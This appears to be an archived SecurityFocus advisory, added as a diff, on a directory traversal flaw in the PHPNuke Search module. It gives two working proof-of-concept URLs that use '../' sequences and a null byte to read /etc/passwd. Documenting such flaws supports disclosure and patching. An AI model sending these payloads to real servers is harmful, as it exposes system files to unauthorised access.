@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/15137/info
+
+PHPNuke Search Module is prone to a directory traversal vulnerability. This is due to a lack of proper sanitization of user-supplied input.
+
+A remote attacker may view files that are only intended to be accessible to authenticated and authorized users. Information obtained may be used in further attacks. 
+
+http://www.example.com/[nuke_dir]/modules.php?name=Search&file=../../../../../../../../../etc/passwd%00
+
+http://www.example.com/[nuke_dir]/modules.php?name=Search&file=../Forums/viewtopic&phpEx=../../../.
+./../../etc/passwd 
